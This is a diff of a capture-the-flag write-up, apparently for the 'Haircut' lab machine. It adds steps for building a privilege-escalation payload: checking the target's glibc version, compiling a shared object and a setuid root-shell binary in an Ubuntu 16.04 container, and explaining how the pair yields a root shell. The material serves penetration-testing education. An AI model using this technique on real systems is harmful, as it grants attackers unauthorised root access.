@@ -165,7 +165,43 @@ int main(void){
 EOF
 gcc -o /tmp/rootshell /tmp/rootshell.c
 ```
-I created these two binaries locally, because compiling from the victim was giving me issues. I had to create a container with Ubuntu 16x to create a compatible binary file. The first file is a `shared object`, which is a file that contains executable binary code and is analogous to dlls. A key feature of `.so` files is that they can be loaded at runtim. This shared object binary changes the owner of the second binary `rootshell` to root, sets the suid bit of that binary, and then unliks itself.
+I created these two binaries locally, because compiling from the victim was giving me issues. I had to create a container with Ubuntu 16x to create a compatible binary file. 
+```bash
+www-data@haircut:/etc$ ldd --version
+ldd (Ubuntu GLIBC 2.23-0ubuntu7) 2.23
+```
+*get version of glibc on victim*
+According to launchpad this version of glibc is used on Ubuntu 16.04. We could also get this from `/etc/issue`
+
+We will create a docker container of this os to compile the binary that we need to upload.
+```bash
+┌──(kali㉿kali)-[~]
+└─$ sudo docker pull ubuntu:16.04
+[sudo] password for kali:
+16.04: Pulling from library/ubuntu
+58690f9b18fc: Pull complete
+b51569e7c507: Pull complete
+da8ef40b9eca: Pull complete
+fb15d46c38dc: Pull complete
+Digest: sha256:1f1a2d56de1d604801a9671f301190704c25d604a416f59e03c04f5c6ffee0d6
+Status: Downloaded newer image for ubuntu:16.04
+docker.io/library/ubuntu:16.04
+
+┌──(kali㉿kali)-[~]
+└─$ sudo docker run -it ubuntu:16.04 bash
+root@cd9bf84e45d3:/# apt-get update
+--snipped--
+
+root@cd9bf84e45d3:/# apt-get install -y build-essential
+--snipped--
+
+root@cd9bf84e45d3:~# gcc -fPIC -shared -ldl -o reddish.so reddish.c
+root@cd9bf84e45d3:~# gcc -o rootred rootred.c
+--snipped warnings--
+
+```
+The first file is a `shared object`, which is a file that contains executable binary code and is analogous to dlls. A key feature of `.so` files is that they can be loaded at runtim. This shared object binary changes the owner of the second binary `rootshell` to root, sets the suid bit of that binary, and then unliks itself.
+
 
 The second binary file sets the group id, user id, effective uid/gid, and then creates a new shell as that user (root). Its a commonly used binary file when an attacker has sudo write priv as it gives you a root shell.
 
